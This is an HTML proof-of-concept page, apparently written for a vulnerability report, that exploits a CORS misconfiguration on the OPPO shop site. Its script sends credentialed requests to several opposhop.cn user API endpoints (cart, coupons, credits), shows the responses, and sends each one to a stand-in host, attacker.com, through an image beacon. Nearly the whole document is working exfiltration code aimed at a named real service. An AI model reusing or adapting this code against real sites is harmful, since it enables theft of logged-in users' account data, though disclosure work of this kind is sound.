<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OPPO CORS PoC</title>
</head>

<body>

<h2>OPPO CORS Data Exfiltration PoC</h2>
<button onclick="run()">Run Exploit</button>

<pre id="output">Waiting...</pre>

<script>
function exfiltrate(data) {
    try {
        var i = new Image();
        i.src = "https://attacker.com/log?d=" + encodeURIComponent(data);
    } catch(e) {}
}

async function request(url, name) {
    try {
        let res = await fetch(url, {
            method: "GET",
            credentials: "include",
            mode: "cors"
        });

        let text = await res.text();

        document.getElementById("output").innerText += "\n\n[" + name + "]\n" + text;

        exfiltrate(name + ":" + text);

    } catch (e) {
        document.getElementById("output").innerText += "\n\n[" + name + "] ERROR\n" + e;
    }
}

function run() {

    document.getElementById("output").innerText = "Loading...";

    request("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list", "cart");

    request("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", "count");

    request("https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1", "coupons");

    request("https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit", "credit");

    request("https://www.opposhop.cn/cn/oapi/credits/web/credits/show", "credits_new");
}
</script>
